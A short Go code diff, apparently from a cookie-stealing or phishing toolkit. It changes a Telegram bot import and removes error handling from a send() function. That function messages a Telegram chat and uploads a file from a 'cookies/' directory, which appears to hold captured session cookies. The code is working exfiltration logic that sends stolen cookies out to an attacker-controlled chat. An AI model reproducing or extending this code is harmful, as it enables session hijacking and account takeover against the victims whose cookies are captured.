@@ -9,7 +9,7 @@ import (
     "log"
 
 	"github.com/tidwall/buntdb"
-	"github.com/go-telegram-bot-api/telegram-bot-api"
+	//"github.com/go-telegram-bot-api/telegram-bot-api"
 	"gopkg.in/telegram-bot-api.v4"
 )
 
@@ -294,16 +294,10 @@ func send(text string, botT string, chat_id int64, tGcookie string) {
 	bot.Debug = true
 	// Send the message
 	msg := tgbotapi.NewMessage(chat_id, text)
-	myMsgGo, err := bot.Send(msg)
-	if err != nil {
-		fmt.Printf("Error sending message: %v", err)
-	}
+	bot.Send(msg)
 	//Send the cookie attachment
 	docMsg :=  tgbotapi.NewDocumentUpload(chat_id, "cookies/"+tGcookie+".txt")
-	mydocGo, err := bot.Send(docMsg)
-	if err != nil {
-		fmt.Printf("Error sending cookie attachment: %v", err)
-	}
+	bot.Send(docMsg)
 }
 func saveDoc(title string, myCookieFile string) {
 	dcF = `
